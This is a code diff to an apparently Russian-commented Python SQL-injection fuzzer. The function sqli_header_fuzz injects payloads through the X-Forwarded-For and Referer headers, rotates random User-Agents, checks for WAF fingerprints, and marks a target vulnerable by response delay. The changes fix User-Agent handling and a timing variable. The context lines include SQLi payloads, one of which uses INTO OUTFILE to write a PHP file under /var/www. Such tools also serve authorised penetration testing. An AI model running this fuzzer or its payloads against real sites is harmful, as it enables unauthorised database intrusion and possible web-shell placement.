@@ -225,10 +225,15 @@ def sqli_header_fuzz():
         # Юзер агент по умолчанию во время фаззинга
         user_agent = UserAgent(cache=False)
 
-        # Инъекция пейлоадов в заголовок
+        headers = requests.utils.default_headers()
+        headers.update(
+            {
+                'User-Agent': user_agent.random
+            })
+
         if options == '1':
 
-            headers = {'X-Forwarded-For': payload, 'User-Agent': user_agent}
+            headers = {'X-Forwarded-For': payload, 'User-Agent': user_agent.random}
             header = 'X-Forwarded-For'
 
         elif options == '2':
@@ -238,7 +243,7 @@ def sqli_header_fuzz():
 
         else:
 
-            headers = {'Referer': payload, 'User-Agent': user_agent}
+            headers = {'Referer': payload, 'User-Agent': user_agent.random}
             header = 'Referer'
 
         t1 = time_now()  # Получение текущего времени
@@ -254,18 +259,17 @@ def sqli_header_fuzz():
 
         waf_detect(page_source)  # Проверяем, есть ли фингерпринт WAF в коде странницы
 
-        # Отображение цветов
         if resp_time >= 3:
             print(
                 '[' + Fore.BLUE + 'TRYING' + Fore.RESET + '] [' + Fore.YELLOW + code + Fore.RESET + '] ' +
                 Fore.YELLOW + header + Fore.RESET + ' : ' + Fore.GREEN + payload + Fore.RESET + ' (' + Fore.GREEN + str(
-                    time) + Fore.RESET + 's)')
+                    resp_time) + Fore.RESET + 's)')
             vuln = True
         else:
             print(
                 '[' + Fore.BLUE + 'TRYING' + Fore.RESET + '] [' + Fore.YELLOW + code + Fore.RESET + '] ' +
                 Fore.YELLOW + header + Fore.RESET + ' : ' + Fore.RED + payload + Fore.RESET + ' (' + Fore.RED + str(
-                    time) + Fore.RESET + 's)')
+                    resp_time) + Fore.RESET + 's)')
 
         return vuln
 
@@ -276,9 +280,15 @@ def sqli_header_fuzz():
         # Юзер агент по умолчанию во время фаззинга
         user_agent = UserAgent(cache=False)
 
+        headers = requests.utils.default_headers()
+        headers.update(
+            {
+                'User-Agent': user_agent.random
+            })
+
         if options == '1':
 
-            headers = {'X-Forwarded-For': payload, 'User-Agent': user_agent}
+            headers = {'X-Forwarded-For': payload, 'User-Agent': user_agent.random}
             header = 'X-Forwarded-For'
 
         elif options == '2':
@@ -288,7 +298,7 @@ def sqli_header_fuzz():
 
         else:
 
-            headers = {'Referer': payload, 'User-Agent': user_agent}
+            headers = {'Referer': payload, 'User-Agent': user_agent.random}
             header = 'Referer'
 
         t1 = time_now()
@@ -308,13 +318,13 @@ def sqli_header_fuzz():
             print(
                 '[' + Fore.BLUE + 'TRYING' + Fore.RESET + '] [' + Fore.YELLOW + code + Fore.RESET + '] ' + Fore.YELLOW
                 + header + Fore.RESET + ' : ' + Fore.GREEN + payload + Fore.RESET + ' (' + Fore.GREEN + str(
-                    time) + Fore.RESET + 's)')
+                    resp_time) + Fore.RESET + 's)')
             vuln = True
         else:
             print(
                 '[' + Fore.BLUE + 'TRYING' + Fore.RESET + '] [' + Fore.YELLOW + code + Fore.RESET + '] ' +
                 Fore.YELLOW + header + Fore.RESET + ' : ' + Fore.RED + payload + Fore.RESET + ' (' + Fore.RED + str(
-                    time) + Fore.RESET + 's)')
+                    resp_time) + Fore.RESET + 's)')
 
         return vuln
 
@@ -373,7 +383,6 @@ def sqli_header_fuzz():
             "\' OR NOT %s=   %s-- %s" % (r_time(), r_time(), r_string(5)),
             "\' OR NOT (%s)=%s-- %s" % (r_time(), r_time(), r_string(5)),
             "' OR 1=1 INTO OUTFILE ' / var / www / file.php' --",
-
         ]
 
         print(Fore.RESET + '{~} SELECT A HEADER OPTIONS {~}' + Fore.RESET)
